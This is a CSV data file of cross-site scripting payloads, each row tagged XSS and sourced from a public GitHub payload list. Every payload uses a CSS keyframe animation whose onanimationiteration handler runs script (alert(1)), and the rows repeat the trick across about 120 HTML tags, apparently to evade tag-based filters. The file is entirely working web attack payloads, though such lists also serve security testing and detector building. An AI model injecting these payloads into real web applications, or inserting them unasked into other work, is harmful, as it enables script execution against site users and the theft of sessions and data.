cve,tag,payload,url
,XSS,"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><col style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></col>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><colgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></colgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dfn>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dl>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></head>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><hgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></i>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><input style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></kbd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></keygen>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></label>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></li>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></link>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><marquee style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></marquee>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><menu style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menu>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menuitem>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><meta style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meta>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><nobr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nobr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><noscript style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noscript>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></object>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><optgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></optgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></output>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><p style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></p>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></picture>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><q style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></q>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rb>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><rtc style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rtc>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><s style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></s>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></samp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><section style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></section>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><select style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></select>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><small style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></small>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><source style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></source>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><span style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></span>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><summary style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></summary>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><svg style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></svg>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></td>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></textarea>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><th style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></th>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><thead style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></thead>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><time style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></time>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><track style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></track>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><u style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></u>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><xmp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xmp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
